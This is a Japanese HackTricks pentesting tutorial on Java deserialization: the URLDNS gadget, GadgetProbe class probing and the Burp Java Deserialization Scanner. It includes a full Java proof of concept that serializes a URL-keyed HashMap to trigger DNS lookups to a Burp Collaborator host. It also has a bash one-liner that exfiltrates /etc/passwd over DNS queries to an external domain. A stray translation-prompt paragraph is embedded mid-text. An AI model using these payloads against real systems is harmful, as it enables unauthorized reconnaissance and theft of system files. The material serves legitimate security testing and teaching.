# Java DNSデシリアライゼーション、GadgetProbe、およびJavaデシリアライゼーションスキャナー

## Java DNSデシリアライゼーション、GadgetProbe、およびJavaデシリアライゼーションスキャナー

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## デシリアライゼーションにおけるDNSリクエスト

クラス`java.net.URL`は`Serializable`を実装しています。これは、このクラスがシリアライズ可能であることを意味します。
```java
public final class URL implements java.io.Serializable {
```
このクラスは**興味深い振る舞いをします。**ドキュメントによると、「**2つのホストは、両方のホスト名が同じIPアドレスに解決される場合に同等と見なされます**」。したがって、URLオブジェクトが**`equals`**または**`hashCode`**の**いずれかの関数を呼び出すたびに、IPアドレスを取得するためのDNSリクエストが送信されます。**

**URL**オブジェクトから**`hashCode`**関数を**呼び出す**のは非常に簡単で、このオブジェクトをデシリアライズされる`HashMap`に挿入するだけで十分です。これは、`HashMap`の**`readObject`**関数の最後にこのコードが実行されるためです：
```java
private void readObject(java.io.ObjectInputStream s)
throws IOException, ClassNotFoundException {
[   ...   ]
for (int i = 0; i < mappings; i++) {
[   ...   ]
putVal(hash(key), key, value, false, false);
}
```
次に、`HashMap`内のすべての値を使用して`putVal`を**実行**します。しかし、より重要なのは、すべての値で`hash`が呼び出されることです。以下は`hash`関数のコードです：
```java
static final int hash(Object key) {
int h;
return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```
以下のように観察できるように、**`HashMap`**をデシリアライズする際には、関数`hash`が**オブジェクトごとに実行され**、**`hash`**の実行中にはオブジェクトの`.hashCode()`が実行されます。したがって、**URL**オブジェクトを含む**`HashMap`**をデシリアライズすると、**URLオブジェクト**は`.hashCode()`を実行します。

では、`URLObject.hashCode()`のコードを見てみましょう：
```java
public synchronized int hashCode() {
if (hashCode != -1)
return hashCode;

hashCode = handler.hashCode(this);
return hashCode;
```
以下のように、`URLObject`が`.hashCode()`を実行すると、`hashCode(this)`と呼ばれます。次に、この関数のコードを見ることができます。
```java
protected int hashCode(URL u) {
int h = 0;

// Generate the protocol part.
String protocol = u.getProtocol();
if (protocol != null)
h += protocol.hashCode();

// Generate the host part.
InetAddress addr = getHostAddress(u);
[   ...   ]
```
以下は、/hive/hacktricks/pentesting-web/deserialization/java-dns-deserialization-and-gadgetprobe.mdというファイルからのコンテンツです。関連する英文を日本語に翻訳し、翻訳を返し、マークダウンとHTMLの構文を正確に保ちます。コード、ハッキング技術の名前、ハッキングの言葉、クラウド/SaaSプラットフォームの名前（Workspace、aws、gcpなど）、'leak'という単語、ペンテスト、およびマークダウンタグなどは翻訳しないでください。また、翻訳とマークダウンの構文以外の追加のものは追加しないでください。

```
getHostAddressがドメインに対して実行され、DNSクエリが発行されることがわかります。

したがって、このクラスは、**シリアライゼーション**が可能であることを**示すために**、または情報を**漏洩**するために、DNSクエリを**実行**するために**悪用**される可能性があります（コマンドの実行結果をサブドメインに追加することができます）。

### URLDNSペイロードのコード例

[ここでysoserialからURDNSペイロードのコードを見つけることができます](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java)。ただし、コードの理解を容易にするために、ysoserialのものをベースにした独自のPoCを作成しました。
```
```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

public class URLDNS {
public static void GeneratePayload(Object instance, String file)
throws Exception {
//Serialize the constructed payload and write it to the file
File f = new File(file);
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(instance);
out.flush();
out.close();
}
public static void payloadTest(String file) throws Exception {
//Read the written payload and deserialize it
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
Object obj = in.readObject();
System.out.println(obj);
in.close();
}

public static void main(final String[] args) throws Exception {
String url = "http://3tx71wjbze3ihjqej2tjw7284zapye.burpcollaborator.net";
HashMap ht = new HashMap(); // HashMap that will contain the URL
URLStreamHandler handler = new SilentURLStreamHandler();
URL u = new URL(null, url, handler); // URL to use as the Key
ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

// During the put above, the URL's hashCode is calculated and cached.
// This resets that so the next time hashCode is called a DNS lookup will be triggered.
final Field field = u.getClass().getDeclaredField("hashCode");
field.setAccessible(true);
field.set(u, -1);

//Test the payloads
GeneratePayload(ht, "C:\\Users\\Public\\payload.serial");
}
}


class SilentURLStreamHandler extends URLStreamHandler {

protected URLConnection openConnection(URL u) throws IOException {
return null;
}

protected synchronized InetAddress getHostAddress(URL u) {
return null;
}
}
```
### 追加情報

* [https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
* 元のアイデアでは、Commons Collectionsのペイロードを変更してDNSクエリを実行することが提案されましたが、これは提案された方法よりも信頼性が低かったです。以下はそのポストです：[https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)

## GadgetProbe

[**GadgetProbe**](https://github.com/BishopFox/GadgetProbe)は、Burp Suite App Store（Extender）からダウンロードできます。

**GadgetProbe**は、サーバーのJavaクラスにいくつかの**Javaクラスが存在するかどうか**を調べるために使用されます。これにより、既知の脆弱性に**対して**脆弱性があるかどうかを知ることができます。

### 動作原理

**GadgetProbe**は、前のセクションと同じ**DNSペイロード**を使用しますが、DNSクエリを実行する**前に**任意のクラスをデシリアライズしようとします。**任意のクラスが存在する**場合、**DNSクエリ**が**送信**され、GadgetProbeはこのクラスが存在することを記録します。**DNS**リクエストが**送信されない**場合、これは**任意のクラスが正常にデシリアライズされなかった**ことを意味します。したがって、それは存在しないか、**シリアライズ可能/攻撃可能ではない**ことを意味します。

GitHub内の[**GadgetProbeにはいくつかのワードリスト**](https://github.com/BishopFox/GadgetProbe/tree/master/wordlists)があります。

![](<../../.gitbook/assets/intruder4 (1) (1) (1).gif>)

### 追加情報

* [https://know.bishopfox.com/research/gadgetprobe](https://know.bishopfox.com/research/gadgetprobe)

## Java Deserialization Scanner

このスキャナは、Burp App Store（Extender）から**ダウンロード**できます。\
この**拡張機能**には、**パッシブ**および**アクティブ**な**機能**があります。

### パッシブ

デフォルトでは、送信されたすべてのリクエストとレスポンスを**パッシブにチェック**し、**Javaシリアライズのマジックバイト**を探し、見つかった場合には脆弱性の警告を表示します。

![](<../../.gitbook/assets/image (290).png>)

### アクティブ

**手動テスト**

リクエストを選択し、右クリックして「Send request to DS - Manual Testing」を選択します。\
次に、_Deserialization Scanner Tab_ --> _Manual testing tab_ 内で**挿入ポイント**を選択し、**テストを実行**します（使用されているエンコーディングに応じて適切な攻撃を選択します）。

![](../../.gitbook/assets/3-1.png)

これは「手動テスト」と呼ばれていますが、かなり**自動化**されています。ウェブサーバー上で利用可能なライブラリをチェックし、**デシリアライズ**が**どのysoserialペイロード**に対して**脆弱**かを自動的にチェックし、脆弱なライブラリを強調表示します。**脆弱なライブラリ**をチェックするためには、**Javas Sleeps**、**CPU**の消費による**sleeps**、または先に述べたように**DNS**を使用して起動するように選択できます。

**攻撃**

脆弱なライブラリを特定したら、リクエストを_Exploiting Tab_に送信できます。\
このタブでは、再び**挿入ポイント**を選択し、**作成するペイロード**と**コマンド**を入力します。その後、適切な**Attack**ボタンを押すだけです。

![](<../../.gitbook/assets/4 (1).png>)

### Java Deserialization DNS Exfil情報

ペイロードを以下のように実行するようにしてください：
```bash
(i=0;tar zcf - /etc/passwd | xxd -p -c 31 | while read line; do host $line.$i.cl1k22spvdzcxdenxt5onx5id9je73.burpcollaborator.net;i=$((i+1)); done)
```
### 詳細情報

* [https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
